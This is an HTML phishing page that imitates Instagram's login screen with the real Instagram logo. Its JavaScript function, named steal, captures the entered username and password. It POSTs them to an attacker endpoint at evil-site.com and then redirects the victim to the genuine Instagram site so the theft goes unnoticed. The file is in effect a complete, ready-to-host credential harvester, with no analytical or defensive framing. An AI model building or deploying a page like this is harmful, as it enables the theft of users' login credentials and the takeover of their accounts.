<!DOCTYPE html>
<html>
  <head>
    <title>Instagram Login</title>
  </head>
  <body style="text-align: center; font-family: sans-serif; margin-top: 50px;">

    <!-- ✅ Instagram Logo (added at top) -->
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" 
         alt="Instagram" 
         style="width: 180px; margin-bottom: 30px;">

    <!-- ✅ Same original form -->
    <form onsubmit="steal(event)">
      <input id="username" type="text" placeholder="Username" required><br><br>
      <input id="password" type="password" placeholder="Password" required><br><br>
      <button type="submit">Log In</button>
    </form>

    <script>
      function steal(e) {
        e.preventDefault();
        const u = document.getElementById("username").value;
        const p = document.getElementById("password").value;

        fetch("https://evil-site.com/steal", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username: u, password: p })
        }).then(() => {
          window.location.href = "https://instagram.com";
        });
      }
    </script>
  </body>
</html>
